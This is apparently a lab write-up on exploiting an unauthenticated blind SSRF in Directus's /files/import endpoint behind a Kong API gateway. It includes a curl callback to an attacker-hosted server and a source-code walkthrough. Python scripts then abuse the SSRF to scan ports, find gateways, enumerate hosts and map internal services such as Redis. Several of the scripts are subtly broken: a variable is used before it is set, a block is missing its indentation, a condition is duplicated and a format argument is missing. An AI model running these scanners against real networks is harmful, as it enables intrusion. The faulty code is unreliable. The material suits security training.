## What is SSRF?

_Server-Side Request Forgery_ (SSRF) occurs when an attacker can force an application or server to request data or a resource.
Since the request is originating at the server, it might be able to access data that the attacker cannot access directly.
The server may also have access to services running on localhost interfaces or other servers behind a firewall or reverse proxy.

In terms of microservices, they will often have fewer security controls in place if they rely upon an API gateway or reverse proxy to implement those controls.
If the microservices are in a flat network, we could use an SSRF vulnerability to make one microservice talk directly to another microservice.
Any controls enforced by the API gateway would not apply to the traffic between the two microservices, allowing an SSRF exploit to gather information about the internal network and open new attack vectors on that network.

## Discovery

We have already fuzzed a few endpoints, and know that we can work with the /files/import endpoint.
The error that we get is the following:

```json
{"errors":
	 [
		 {"message":"\"url\" is required",
		 "extensions":
			{"code":"INVALID_PAYLOAD"}
		}
	]
}
```

We can further investigate this endpoint, by providing the missing value that's being asked for i.e. the url parameter.
We will also send the value in a POST request as json as the error message is in JSON.

We will use our attacker machine's apache server. This will let us read the logs and identify if our target endpoint is vulnerable to SSRF or not.
We start by hosting an apache server, and then sending it as the payload in our curl request to the /files/import endpoint:

```bash
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
```

![](../../03.%20Images/t9-ss8.png)

We receive an HTTP 500 response with a message of "Request failed with status code 404".
However, upon checking our apache logs, we see that a request to our attacking machine was in fact made, and thus, the target is vulnerable to SSRF.

The request made was:
```json
192.168.145.135 - - [04/Dec/2022:08:10:09 -0500] "GET /ssrftest HTTP/1.1" 404 457 "-" "axios/0.21.1"
```

The user agent on the request is **Axios** an HTTP client for Node.js.
we can see that even though the request was made to our apache server, the server does not show the contents of the file, even if it does exist on our attacker machine.
This is referred to as a blind SSRF vulnerability.

## Analyzing the Source Code

Even though we have found the vulnerability, it is important to understand what is available in the source code, and what part of code allows the vulnerability to exist.

We can start with the authentication handler which is defined in /api/src/middleware/authenticate.ts:

![](../../03.%20Images/t9-ss9.png)

The function creates a new _accountability_ object on the request.
The user and role variables, are set to null, and of course, the admin role, is set to false.
The function then checks, if there is a token on the request object.
If there is no token, the functions returns next(), which passes execution to the middleware function.
This means, that if we make a request without a token, the authentication handler will create the default accountability object, and pass the execution to the next middleware function.

Now that we understand the authentication mechanism, we can move on the files controller. We will be lookin at the files.ts file:

![](../../03.%20Images/t9-ss10.png)

We are interested in the function that we found the vulnerability in, i.e. the import function.
The function starts by validating the request body and throwing an error if the body is invalid.
Next, the code creates a _FileService_ object with the _accountability_ object created by the authentication handler.

Next:

![](../../03.%20Images/t9-ss11.png)

The function uses the _axios_ library to request the value submitted in the _url_ parameter, and stores the results of the request, in the fileResponse variable.
At this point, the code has not checked if the initial request to the files controller contained a valid JSON web token (JWT).

![](../../03.%20Images/t9-ss12.png)

We don't encounter any authentication checks, until later on in the code.
To summarize, the _readByKey()_ function of _FileService_ is responsible for checking authorization.
_FileService_ inherits the _readByKeys()_ function from _ItemService_.
The _processAST()_ function defined in /api/src/services/authorization.ts handles authorization.

Since the application downloads the contents of the submitted URL before checking authorization for the storage and retrieval of those contents, the application is vulnerable to unauthenticated blind SSRF. Authenticated users would likely be able to use the files import functionality and access the retrieved data.

## Exploiting the Vulnerability

Exploiting blind SSRF is of course slightly complicated, as we can't see the result of what's being fetched. However, we can explore the application further, as the application returns different messages for files that do exist vs files that don't.

We can use the SSRF to force Directus to connect to itself.
If we send a localhost URL, the application should attempt to connect to its own server.

![](../../03.%20Images/t9-ss13.png)

We received an error that the connection was refused.
This new error message is interesting.
We know port 8000 is open externally on the API Gateway server. However, if Directus is running on a different server behind the API gateway, "localhost" would refer to the server running Directus, not the server running Kong API Gateway.
A quick Google search reveals that the default port for Directus is 8055.

Now, we can make the same request, but to port 8055:

![](../../03.%20Images/t9-ss14.png)

The server returned the "FORBIDDEN" error code, so we did request a valid resource.
We can easily verify that TCP port 8055 is closed externally on the Kong API Gateway server with something like an Nmap scan.
We are likely dealing with two or more servers in this scenario.

## Port Scanning

Even though we can't access the results of the SSRF vulnerability, we can still use the different HTTP response codes and error messages to determine if we've requested a valid resource.\
We can use this information to write a script that will exploit the SSRF vulnerability and act as a port scanner.

We will take a few common ports, instead of massive ranges, to keep the exploit less noisy.
The script will be as follows:

```python
#!/usr/bin/env python3

##import modules##
import argparse
import requests

##set the arguments##
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

##define the ports we want to scan##
ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']

##set the latency between requests##
timeout = float(args.timeout)

##start a loop for the ports##
for p in ports:
    try:
	    ##send a request for each port on provided server##
        r = requests.post(url=args.target, json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))}, timeout=timeout)

		##verbosity##
        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

		##show the open port##
        if "You don't have permission to access this." in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))

		##if the connection is refused, show that the port is closed##
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED".format(port=int(p)))

		##if given a 404 status code, show that the file does not exist##
        elif "Request failed with status code 404" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))

		##if the error is not being able to parse, then it might be a non-http open port##
        elif "Parse Error" in r.text:
            print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))

		##could be a closed non-http port##
        elif "Parse Error" in r.text:
            print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))

		##print the response##
        else:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

	##catch exceptions##
    except requests.exceptions.Timeout:
        print("{port:0} \t timed out".format(port=int(p)))
```

Running the script:

![](../../03.%20Images/t9-ss15.png)

We only scanned a handful of ports, but only port 8055 is open, which the web service is running on.
The common services for connecting to a server, such as SSH and RDP, are either not present or not running on their normal ports.
We are likely communicating with a microservice running in a **container**.

## Scanning Subnet

We know that Directus is a platform for managing the content of an SQL database. This would be reasonable enough, to assume, that Directus will connect to a database server.
We will use our SSRF vulnerability, to find the server in the local network.

However, scanning entire /8 or even a /12 subnets, can take up to days.
So, instead of scanning the entire subnet, we can try for scanning network gateways.
Network designs commonly use a /16 or /24 subnet mask with the gateway running on the IP where the forth octet is ".1"
Even though, gateways can live on any IP address and subnets can be any size. In black box situations, we should start with the most common value.

If we curl, for a valid IP address, in the network, such as the loopback IP address, we get a response within a second.
However, if the IP does not exist, it takes over a minute for the request to timeout. This can be an indicator, of whether the IP address is valid or invalid:

![](../../03.%20Images/t9-ss16.png)

We can now move on to creating a script for us, that will scan for all valid network gateways. We will start by scanning the 172.16.0.0/12 network.
The script will look like so:

```python
#!/usr/bin/env python3

##import modules##
import argparse
import requests

##set the arguments##
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

##set the valid variables##
baseurl = args.target
args = parser.parse_args()
timeout = float(args.timeout)
baseurl = args.target

##set the base ip##
##only use 1 as the 4th octet for gateways#
base_ip = "http://172.{two}.{three}.1"

##start the for loop#
for y in range(16,256):
    for x in range(1,256):
        host = base_ip.format(two=int(y), three=int(x))
        print("Trying host: {host}".format(host=host))

		##setting port(does not matter since checking if alive or not)
        p = 8000
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:8000".format(host=host)}, timeout=timeout)
		##verbosity##
        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

		##show the open port##
        if "You don't have permission to access this." in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))

		##if the connection is refused, show that the port is closed##
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED".format(port=int(p)))

		##if given a 404 status code, show that the file does not exist##
        elif "Request failed with status code 404" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))

		##if the error is not being able to parse, then it might be a non-http open port##
        elif "Parse Error" in r.text:
            print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))

		##could be a closed non-http port##
        elif "socket hang up" in r.text:
            print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))

		##print the response##
        else:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

	##catch exceptions##
    except requests.exceptions.Timeout:
        print("{port:0} \t timed out".format(port=int(p)))
```

Running the script, we find one open gateway:

![](../../03.%20Images/t9-ss17.png)

## Host Enumeration

Now that we know what subnet we're working with, it's time to scan what hosts are live on the network.
This means, we will, edit our previous script to find hosts, instead of gateways.
The script will only have minute changes and will look like so:

```python
#!/usr/bin/env python3

##import modules##
import argparse
import requests

##set the arguments##
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

##set the valid variables##
args = parser.parse_args()
baseurl = args.target
timeout = float(args.timeout)
ports = ['8000']

##set the base ip##
##only use 1 as the 4th octet for gateways#
base_ip = "http://172.16.16.{four}"

##start the for loop#
for x in range(1,255):
        host = base_ip.format(four=int(x))
        print("Trying host: {host}".format(host=host))
        p = 8000
		##deal with responses##
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:8000".format(host=host)}, timeout=timeout)
            
            ##verbosity##
            if args.verbose:
                print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

            ##show the open port##
            if "You don't have permission to access this." in r.text:
                print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))

            ##if the connection is refused, show that the port is closed##
            elif "ECONNREFUSED" in r.text:
                print("{port:0} \t OPEN - connection refused".format(port=int(p)))

            ##if given a 404 status code, show that the file does not exist##
            elif "Request failed with status code 404" in r.text:
                print("{port:0} \t OPEN - returned 404".format(port=int(p)))

            ##if the error is not being able to parse, then it might be a non-http open port##
            elif "Parse Error" in r.text:
                print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))

            ##could be a closed non-http port##
            elif "socket hang up" in r.text:
                print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))

            ##print the response##
            else:
                print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

        ##catch exceptions##
        except requests.exceptions.Timeout:
            print("{port:0} \t timed out".format(port=int(p)))
```

Running the script:

![](../../03.%20Images/t9-ss18.png)

Based on the response values, we can assume the first six hosts are valid.

## Scanning Ports

Now that we have scanned live hosts, we can move on to find what common ports are open on the hosts that we found.
The edited script will look like so:

```python
#!/usr/bin/env python3

##import modules##
import argparse
import requests

##set the arguments##
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

##set the valid variables##
args = parser.parse_args()
baseurl = args.target
timeout = float(args.timeout)
ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']

##set the base ip##
##only use 1 as the 4th octet for gateways#
base_ip = "http://172.16.16.{four}"

##start the for loop#
for x in range(1,7):
    host = base_ip.format(four=int(x))
    print("Trying host: {host}".format(host=host))
    for p in ports:    
		##deal with responses##
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:{port}".format(host=host)}, timeout=timeout)
            
            ##verbosity##
            if args.verbose:
                print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

            ##show the open port##
            if "You don't have permission to access this." in r.text:
                print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))

            ##if given a 404 status code, show that the file does not exist##
            elif "Request failed with status code 404" in r.text:
                print("{port:0} \t OPEN - returned 404".format(port=int(p)))

            ##if the error is not being able to parse, then it might be a non-http open port##
            elif "Parse Error" in r.text:
                print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))

            ##could be a closed non-http port##
            elif "socket hang up" in r.text:
                print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))

        ##catch exceptions##
        except requests.exceptions.Timeout:
            print("{port:0} \t timed out".format(port=int(p)))
```

Running the script:

![](../../03.%20Images/t9-ss19.png)

The open ports bring us to the following conclusion:

![](../../03.%20Images/t9-ss20.png)

172.16.16.1 - Gateway of subnet
172.16.16.2 - Kong API as port 8000 and 8001 are open
172.16.16.4 - Directus as port 8055 is open
172.16.16.5 - unknown
172.16.16.6 - REDIS server as port 6379 is open
